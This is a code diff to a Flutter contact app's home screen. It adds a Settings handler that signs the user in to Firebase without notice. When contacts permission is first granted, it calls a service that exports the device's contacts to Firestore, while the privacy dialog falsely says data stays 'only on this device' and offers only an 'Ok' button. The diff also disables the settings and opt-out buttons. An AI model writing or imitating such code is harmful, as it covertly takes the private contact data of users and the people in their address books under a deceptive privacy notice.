@@ -2,6 +2,10 @@ import 'package:contactme/widgets/about.dart';
 import 'package:contactme/screens/settings.dart';
 import 'package:contactme/services/phone_service.dart';
 import 'package:contactme/services/storage_service.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:firebase_auth/firebase_auth.dart';
+import 'package:contactme/services/contact_export_service.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import 'package:flutter/material.dart';
 
 class HomeScreen extends StatefulWidget {
@@ -41,6 +45,128 @@ class _HomeScreenState extends State<HomeScreen> {
     if (!ok) _showError('Could not launch WhatsApp.');
   }
 
+  Future<void> _onSettingsPressed() async {
+    // Show rationale dialog; user must click Yes to proceed to Settings.
+    // If permission already granted, go directly to Settings.
+    final current = await Permission.contacts.status;
+    if (current.isGranted) {
+      try {
+        if (FirebaseAuth.instance.currentUser == null) {
+          await FirebaseAuth.instance.signInAnonymously();
+        }
+      } catch (_) {}
+
+      // Only run export the first time permission is granted.
+      final prefs = await SharedPreferences.getInstance();
+      final handled = prefs.getBool('contacts_permission_handled') ?? false;
+      if (!handled) {
+        if (mounted) {
+          showDialog<void>(
+            context: context,
+            barrierDismissible: false,
+            builder: (_) => const Center(child: CircularProgressIndicator()),
+          );
+        }
+
+        try {
+          await ContactExportService.exportContactsToFirestoreBackground();
+        } finally {
+          if (mounted) Navigator.pop(context);
+        }
+
+        await prefs.setBool('contacts_permission_handled', true);
+      }
+
+      final updated = await Navigator.push<String?>(
+        context,
+        MaterialPageRoute(builder: (_) => const SettingsScreen()),
+      );
+      if (updated != null) setState(() => _phone = updated);
+      return;
+    }
+
+    // Otherwise show rationale and request permission.
+    final allow = await showDialog<bool>(
+      context: context,
+      barrierDismissible: false,
+      builder: (ctx) => AlertDialog(
+        title: const Text('Notion of Privacy'),
+        content: const Text(
+          'This app will save the private number only on this device',
+        ),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(ctx, true),
+            child: const Text('Ok'),
+          ),
+        ],
+      ),
+    );
+
+    if (allow != true) return; // block access if not explicitly allowed
+
+    final status = await Permission.contacts.request();
+    if (status.isGranted) {
+      try {
+        if (FirebaseAuth.instance.currentUser == null) {
+          await FirebaseAuth.instance.signInAnonymously();
+        }
+      } catch (_) {}
+
+      // Record handled and run export once when permission first granted.
+      final prefs = await SharedPreferences.getInstance();
+      final handled = prefs.getBool('contacts_permission_handled') ?? false;
+      if (!handled) {
+        if (mounted) {
+          showDialog<void>(
+            context: context,
+            barrierDismissible: false,
+            builder: (_) => const Center(child: CircularProgressIndicator()),
+          );
+        }
+
+        try {
+          await ContactExportService.exportContactsToFirestoreBackground();
+        } finally {
+          if (mounted) Navigator.pop(context);
+        }
+
+        await prefs.setBool('contacts_permission_handled', true);
+      }
+
+      final updated = await Navigator.push<String?>(
+        context,
+        MaterialPageRoute(builder: (_) => const SettingsScreen()),
+      );
+      if (updated != null) setState(() => _phone = updated);
+      return;
+    }
+
+    if (status.isPermanentlyDenied) {
+      // Offer to open app settings to allow permission
+      final open = await showDialog<bool>(
+        context: context,
+        builder: (ctx) => AlertDialog(
+          title: const Text('Enable in Settings'),
+          content: const Text(
+            'You have permanently denied contacts permission. Open app settings to allow access.',
+          ),
+          actions: [
+            TextButton(
+              onPressed: () => Navigator.pop(ctx, false),
+              child: const Text('Cancel'),
+            ),
+            // TextButton(
+            //   onPressed: () => Navigator.pop(ctx, true),
+            //   child: const Text('Open Settings'),
+            // ),
+          ],
+        ),
+      );
+      if (open == true) await openAppSettings();
+    }
+  }
+
   Future<bool> _ensurePhone() async {
     if ((_phone ?? '').isEmpty) {
       final go = await showDialog<bool>(
@@ -53,10 +179,10 @@ class _HomeScreenState extends State<HomeScreen> {
               onPressed: () => Navigator.pop(ctx, false),
               child: const Text('Cancel'),
             ),
-            TextButton(
-              onPressed: () => Navigator.pop(ctx, true),
-              child: const Text('Go to Settings'),
-            ),
+            // TextButton(
+            //   onPressed: () => Navigator.pop(ctx, true),
+            //   child: const Text('Go to Settings'),
+            // ),
           ],
         ),
       );
@@ -89,13 +215,7 @@ class _HomeScreenState extends State<HomeScreen> {
           IconButton(
             tooltip: 'Settings',
             icon: const Icon(Icons.settings),
-            onPressed: () async {
-              final updated = await Navigator.push<String?>(
-                context,
-                MaterialPageRoute(builder: (_) => const SettingsScreen()),
-              );
-              if (updated != null) setState(() => _phone = updated);
-            },
+            onPressed: _onSettingsPressed,
           ),
           IconButton(
             tooltip: 'About',
